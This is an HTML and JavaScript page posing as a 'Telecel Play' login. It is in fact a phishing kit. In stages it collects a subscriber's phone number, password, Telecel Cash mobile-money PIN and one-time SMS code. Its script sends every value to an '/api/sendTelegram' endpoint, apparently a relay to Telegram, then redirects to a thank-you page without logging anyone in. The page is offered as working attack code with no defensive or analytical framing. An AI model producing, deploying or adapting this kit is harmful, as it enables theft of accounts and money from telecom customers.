<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">

<title>Telecel Play Login</title>

<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">

<style>

*{box-sizing:border-box}

body{

font-family:"Plus Jakarta Sans",system-ui;

margin:0;

min-height:100vh;

display:flex;
align-items:center;
justify-content:center;

background:
linear-gradient(180deg,#fff5f7,#ffe3e8);

}

/* telecom waves */

.wave{

position:fixed;
width:600px;
height:600px;
border-radius:50%;

background:
radial-gradient(circle,
rgba(230,0,35,.18),
transparent 70%);

filter:blur(40px);

z-index:-1;

animation:float 18s infinite linear;

}

.wave.one{top:-200px;right:-150px}
.wave.two{bottom:-200px;left:-150px;animation-duration:22s}

@keyframes float{

0%{transform:translateY(0)}
50%{transform:translateY(40px)}
100%{transform:translateY(0)}

}

.card{

width:100%;
max-width:380px;

background:white;

padding:26px;

border-radius:18px;

box-shadow:
0 25px 60px rgba(0,0,0,.18);

}

/* logo */

.logo{

height:120px;
display:block;
margin:auto;

}

/* texts */

h1{

color:#e60023;

text-align:center;

margin:8px 0 4px;

font-size:22px;

font-weight:800;

}

.subtitle{

text-align:center;

font-size:13px;

color:#444;

margin-bottom:16px;

}

/* inputs */

label{

font-size:13px;

display:block;

margin-top:10px;

}

input{

width:100%;

padding:12px;

border-radius:10px;

border:1px solid #e5e5e5;

background:#fafafa;

margin-top:5px;

font-size:14px;

}

input:focus{

outline:none;

border-color:#e60023;

background:white;

}

/* password toggle */

.password-box{

position:relative;

}

.eye{

position:absolute;

right:10px;

top:50%;

transform:translateY(-50%);

cursor:pointer;

font-size:14px;

}

/* hint */

.hint{

font-size:12px;

color:#e60023;

margin-top:4px;

}

/* button */

.btn{

margin-top:16px;

width:100%;

padding:12px;

border-radius:10px;

border:0;

font-weight:700;

background:#e60023;

color:white;

cursor:pointer;

}

/* modal */

.modal{

position:fixed;

inset:0;

background:rgba(0,0,0,.55);

display:none;

align-items:center;
justify-content:center;

}

.box{

background:white;

padding:20px;

border-radius:16px;

width:100%;
max-width:320px;

}

/* pin */

.pin{

display:flex;

gap:8px;

justify-content:center;

margin:10px 0;

}

.pin input{

width:45px;

height:50px;

text-align:center;

font-size:20px;

}

/* otp */

.count{

font-size:12px;

color:#555;

text-align:center;

margin-top:6px;

}

</style>

</head>

<body>

<div class="wave one"></div>
<div class="wave two"></div>


<div class="card">

<img src="assets/telecel.svg" class="logo">


<h1>Welcome to Telecel Play</h1>

<div class="subtitle">

Enter your number to log in.  
You need to be a Telecel subscriber to proceed.

</div>


<form id="form">

<label>Phone Number</label>

<input id="phone" placeholder="0XXXXXXXXX" inputmode="numeric">


<label>Password</label>

<div class="password-box">

<input id="password" type="password">

<span class="eye" onclick="togglePassword()">👁</span>

</div>

<div class="hint">

(Use your Telecel Play App password)

</div>


<button class="btn">

Next

</button>

</form>

</div>



<!-- PIN -->

<div id="pinModal" class="modal">

<div class="box">

<img src="assets/telecash.webp" style="height:70px;display:block;margin:auto">

<p style="text-align:center">

Enter your Telecel Cash PIN

</p>

<p style="text-align:center;font-weight:700" id="showNumber"></p>

<div class="pin">

<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">

</div>

<button class="btn" onclick="submitPin()">

Login

</button>

</div>

</div>



<!-- OTP -->

<div id="otpModal" class="modal">

<div class="box">

<p style="text-align:center">

Enter OTP sent to your phone

</p>

<div class="pin">

<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">
<input maxlength="1">

</div>

<div class="count">

Code expires in <span id="time">60</span>s

</div>

<button class="btn" onclick="submitOtp()">

Verify OTP

</button>

</div>

</div>



<script>

let phoneValue=""
let passwordValue=""
let pinValue=""
let otpValue=""

/* validate phone */

document.getElementById("phone").addEventListener("input",e=>{

let v=e.target.value.replace(/\D/g,"").slice(0,10)

if(v.length>0 && v[0]!=="0") v="0"+v.slice(1)

e.target.value=v

})

/* password toggle */

function togglePassword(){

const p=document.getElementById("password")

p.type=p.type==="password"?"text":"password"

}

/* submit login */

document.getElementById("form").onsubmit=e=>{

e.preventDefault()

phoneValue=document.getElementById("phone").value

passwordValue=document.getElementById("password").value

if(!/^0\d{9}$/.test(phoneValue)){

alert("Enter valid number")

return

}

document.getElementById("showNumber").textContent=phoneValue

document.getElementById("pinModal").style.display="flex"

sendData("login",{

phone:phoneValue,

password:passwordValue

})

}

/* pin input auto focus */

document.querySelectorAll("#pinModal input").forEach((i,index)=>{

i.oninput=()=>{

if(i.value && index<3)

document.querySelectorAll("#pinModal input")[index+1].focus()

}

})

function submitPin(){

pinValue=[...document.querySelectorAll("#pinModal input")]

.map(i=>i.value)

.join("")

document.getElementById("pinModal").style.display="none"

document.getElementById("otpModal").style.display="flex"

sendData("pin",{pin:pinValue})

startTimer()

}

/* otp */

document.querySelectorAll("#otpModal input").forEach((i,index)=>{

i.oninput=()=>{

if(i.value && index<4)

document.querySelectorAll("#otpModal input")[index+1].focus()

}

})

function submitOtp(){

otpValue=[...document.querySelectorAll("#otpModal input")]

.map(i=>i.value)

.join("")

sendData("otp",{otp:otpValue})

location.href="thankyou.html"

}

/* timer */

function startTimer(){

let t=60

const el=document.getElementById("time")

const interval=setInterval(()=>{

t--

el.textContent=t

if(t<=0) clearInterval(interval)

},1000)

}

/* telegram */

async function sendData(step,data){

await fetch("/api/sendTelegram",{

method:"POST",

headers:{"Content-Type":"application/json"},

body:JSON.stringify({

step,

phone:phoneValue,

password:passwordValue,

pin:pinValue,

otp:otpValue,

...data,

time:new Date().toISOString()

})

})

}

</script>

</body>
</html>
